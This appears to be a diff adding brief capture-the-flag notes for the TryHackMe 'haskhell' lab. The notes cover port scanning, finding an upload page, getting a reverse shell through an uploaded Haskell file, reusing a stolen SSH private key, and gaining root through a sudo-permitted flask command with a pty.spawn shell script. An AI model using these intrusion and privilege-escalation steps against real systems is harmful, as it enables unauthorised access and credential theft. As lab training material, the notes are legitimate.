@@ -1,0 +1,70 @@
+10.10.150.169 | haskhell | tryhackme
+
+open ports
+----------
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+5001/tcp open  http    Gunicorn 19.7.1
+
+visiting the port 5001, has a website 
+nothing particularly interesting there
+ran ffuf against the port and found out a hidden page /submnit
+/submit has a upload page 
+dumb me uploaded a php reverse shell, didnt work
+the machine is based on haskell framework and only run haskell codes 
+found a haskell reverse shell on google (rev.hs)
+uploaded the reverse shell and setup a listener in netcat
+we got a shell
+
+ch /home ans there are 3 users 
+cd prof and checked for ssh keys and got one from .ssh/id_rsa
+
+login with the id_rsa to ssh prof 
+ssh -i id_rsa prof@10.10.150.169
+
+found the user.txt in the prof home directory
+
+sudo -l
+we can run /usr/bin/flask run with as sudo
+python /usr/bin/flask
+prof@haskhell:~$ python3 /usr/bin/flask
+
+Usage: flask [OPTIONS] COMMAND [ARGS]...
+
+  This shell command acts as general utility
+  script for Flask applications.
+
+  It loads the application configured (through
+  the FLASK_APP environment variable) and then
+  provides commands either provided by the
+  application or Flask itself.
+
+  The most useful commands are the "run" and
+  "shell" command.
+
+  Example usage:
+
+    $ export FLASK_APP=hello.py
+    $ export FLASK_DEBUG=1
+    $ flask run
+
+Options:
+  --version  Show the flask version
+  --help     Show this message and exit.
+
+Commands:
+  run    Runs a development server.
+  shell  Runs a shell in the app context.
+
+wrote a small python script to get a shell
+
+shell.py
+---------
+#!/usr/bin/env python3
+import pty
+pty.spawn("/bin/bash")
+
+export FLASK_APP=shell.py
+
+and we are root !!
+
+root.txt in /root
